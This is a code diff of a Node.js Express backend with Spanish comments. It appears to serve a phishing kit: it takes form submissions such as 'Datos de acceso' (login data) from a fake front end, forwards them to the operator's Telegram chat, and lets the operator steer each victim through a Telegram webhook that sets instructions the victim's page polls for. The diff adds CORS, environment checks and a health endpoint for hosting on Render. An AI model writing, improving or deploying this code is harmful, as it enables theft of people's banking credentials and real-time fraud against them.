@@ -1,20 +1,28 @@
-// server.js
-
 const express = require('express');
 const bodyParser = require('body-parser');
+const cors = require('cors');
 const fetch = require('node-fetch');
 require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+app.use(cors()); // ✅ Necesario para evitar bloqueo CORS en Render
 app.use(bodyParser.json());
 
-// Memoria temporal de sesiones
 const sesiones = new Map();
-
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+
+if (!BOT_TOKEN || !CHAT_ID) {
+  console.error("❌ BOT_TOKEN o CHAT_ID no definidos en .env o en variables de entorno de Render");
+  process.exit(1);
+}
+
+// Endpoint raíz para que Render verifique que el servicio está vivo
+app.get("/", (req, res) => {
+  res.send("🟢 Backend funcionando");
+});
 
 const pasos = {
   virtualpersona: "Datos de acceso",
@@ -56,7 +64,7 @@ async function enviarMensajeTelegram(titulo, datos, sessionId) {
   });
 }
 
-// Rutas que guardan datos y notifican
+// Rutas para recibir los datos desde frontend
 for (const ruta in pasos) {
   app.post(`/${ruta}`, async (req, res) => {
     const { sessionId, ...datos } = req.body;
@@ -67,7 +75,7 @@ for (const ruta in pasos) {
   });
 }
 
-// Polling del cliente esperando redirección
+// Cliente pregunta por instrucciones
 app.get('/instruction/:sessionId', (req, res) => {
   const { sessionId } = req.params;
   const sesion = sesiones.get(sessionId);
@@ -80,7 +88,7 @@ app.get('/instruction/:sessionId', (req, res) => {
   res.json({});
 });
 
-// Webhook de Telegram
+// Webhook de Telegram que cambia la instrucción
 app.post('/telegram/webhook', async (req, res) => {
   const { callback_query } = req.body;
   if (!callback_query) return res.sendStatus(200);
@@ -100,5 +108,5 @@ app.post('/telegram/webhook', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`Servidor corriendo en puerto ${PORT}`);
+  console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
 });
